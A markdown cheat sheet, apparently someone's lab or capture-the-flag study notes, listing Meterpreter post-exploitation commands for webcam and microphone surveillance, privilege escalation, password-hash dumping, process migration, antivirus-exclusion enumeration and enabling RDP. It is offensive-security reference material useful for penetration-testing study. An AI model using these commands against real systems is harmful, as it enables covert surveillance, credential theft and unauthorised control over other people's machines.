# Meterpreter Command Reference Notes

The command `meterpreter > ?` is used to display available commands within the **Meterpreter** shell.  
`?` is shorthand for listing commands and modules, grouped by categories such as **stdapi (standard API)** and **priv (privilege escalation)**.

---

## Stdapi: Webcam Commands
Commands for interacting with webcams and microphones.

| Command        | Description                                               |
|----------------|-----------------------------------------------------------|
| `record_mic`   | Record audio from the default microphone for *X* seconds. |
| `webcam_chat`  | Start a video chat.                                       |
| `webcam_list`  | List available webcams.                                   |
| `webcam_snap`  | Take a snapshot from the specified webcam.                |
| `webcam_stream`| Play a video stream from the specified webcam.            |

---

## Stdapi: Audio Output Commands
Commands for controlling audio playback on the target system.

| Command | Description                                                                 |
|---------|-----------------------------------------------------------------------------|
| `play`  | Play an audio file on the target system (nothing written to disk).          |

---

## Priv: Elevate Commands
Commands for escalating privileges on the target system.

| Command     | Description                                                               |
|-------------|---------------------------------------------------------------------------|
| `getsystem` | Attempt to elevate your privilege to that of the **local system account**.|

---

## Additional Meterpreter Commands & Context

| Command / Search | Description                                                                                      |
|------------------|--------------------------------------------------------------------------------------------------|
| `screenshot`     | Capture a screenshot of the target system.                                                       |
| `getsystem`      | Attempt to elevate privileges to SYSTEM.                                                         |
| `getuid`         | Display the username the Meterpreter session is running as.                                      |
| `hashdump`       | Dump password hashes from the target system.                                                     |
| `show_mount`     | List mounted drives/shares.                                                                      |
| `ps`             | List running processes.                                                                          |
| `migrate 2212`   | Migrate Meterpreter to another process (PID 2212 in this case).                                  |
| `sysinfo`        | Display system information (OS, architecture, etc.).                                             |
| `download flag.txt` | Download a file (`flag.txt`) from the target system.                                          |
| `search migrate` | Search for migration-related modules.                                                            |
| `post/windows/manage/archmigrate` | Change the architecture of the current session.                                 |
| `post/windows/manage/migrate`     | Migrate Meterpreter to another process.                                         |
| `search win_privs` | Search for Windows privilege enumeration modules.                                              |
| `post/windows/gather/win_privs`   | Enumerate privileges of the user session.                                       |
| `post/windows/gather/enum_logged_on_users` | Enumerate logged-on users.                                             |
| `search checkvm` | Search for VM-detection modules.                                                                 |
| `post/windows/gather/checkvm` | Check if the target is running inside a virtual machine.                            |
| `search enum_application` | Search for application enumeration modules.                                             |
| `post/windows/gather/enum_application` | Enumerate installed applications.                                          |
| `loot`           | Show collected loot (stored in `/root/msf/loot/`).                                               |
| `search type:post platform:windows enum_av` | Search for AV enumeration modules.                                    |
| `post/windows/gather/enum_av_excluded` | Enumerate antivirus exclusions.                                            |
| `set session` → `run` | Set a session and run the module to gather AV/Defender/Symantec data.                       |
| `search enum_computers` | Search for modules to enumerate computers in the network/domain.                          |
| `post/windows/gather/enum_computers` | Determine if the computer is part of a domain.                               |
| `search enum_patches` | Search for patch enumeration modules.                                                       |
| `shell`          | Drop into a system shell on the target.                                                          |
| `systeminfo`     | Show system information, including installed patches and hotfix IDs.                             |
| `search enum_shares` | Search for file share enumeration modules.                                                   |
| `post/windows/gather/enum_shares` | Enumerate shared resources.                                                     |
| `set sessions`   | Assign session(s) for module execution.                                                          |
| `search rdp platform:windows` | Search for RDP-related modules.                                                     |
| `post/windows/manage/enable_rdp` | Enable RDP on the target system.                                                 |

---

## Contextual Notes
- These commands highlight Meterpreter’s capability for **post-exploitation** tasks:  
  - Surveillance (e.g., `record_mic`, `webcam_stream`, `screenshot`).  
  - Privilege escalation (e.g., `getsystem`, privilege enumeration modules).  
  - Lateral movement and persistence (`migrate`, `archmigrate`, `enable_rdp`).  
  - Information gathering (`sysinfo`, `enum_*` modules).  
  - Credential access (`hashdump`).  
- Collected **loot** is saved in `/root/msf/loot/`.  
